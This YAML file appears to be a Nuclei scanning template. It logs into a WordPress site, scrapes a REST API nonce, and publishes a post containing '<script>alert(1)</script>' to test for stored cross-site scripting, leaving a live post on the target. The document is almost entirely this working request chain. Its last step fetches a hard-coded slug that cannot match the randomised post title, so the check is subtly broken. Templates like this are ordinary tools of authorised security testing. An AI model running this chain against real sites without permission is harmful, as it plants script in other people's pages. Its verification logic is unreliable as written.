id: wordpress-create-post

info:
  name: WordPress - Create New Post via REST API
  author: YourName
  severity: info
  description: |
    This template logs into WordPress and creates a new post with a specified title and content
    using the REST API. Requires valid Contributor+ credentials.
  tags: wordpress,rest-api,create-post,authenticated

variables:
  post_title: "Bài Viết Mới Từ Nuclei - {{randstr}}"
  post_content: "<script>alert(1)</script>"

http:
  - raw:
      # Step 1: Login to WordPress
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check

        log={{username}}&pwd={{password}}&wp-submit=Log+In&redirect_to=/wp-admin/&testcookie=1

      # Step 2: Ge t nonce from post-new page
      - |
        GET /wp-admin/post-new.php HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}

      # Step 3: Create new post via REST API
      - |
        POST /wp-json/wp/v2/posts HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Accept: application/json
        Content-Type: application/json
        X-WP-Nonce: {{nonce}}

        {
          "title": "{{post_title}}",
          "content": "{{post_content}}",
          "status": "publish"
        }
      - |
        GET /bai-viet-moi-tu-nuclei-2wmcejpfoqjfegdrufgm075tlvt/ HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}


    cookie-reuse: true

    extractors:
      - type: regex
        name: nonce
        part: body
        group: 1
        internal: true
        regex:
          - 'wpApiSettings\s*=\s*{[^}]*?["'']nonce["'']\s*:\s*["'']([a-zA-Z0-9]+)["'']'
          - '"nonce":"([a-zA-Z0-9]+)"'
          - 'name="_wpnonce" value="([a-zA-Z0-9]+)"'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 201
          - 200
      - type: word
        words:
        - <script>alert(1)</script>
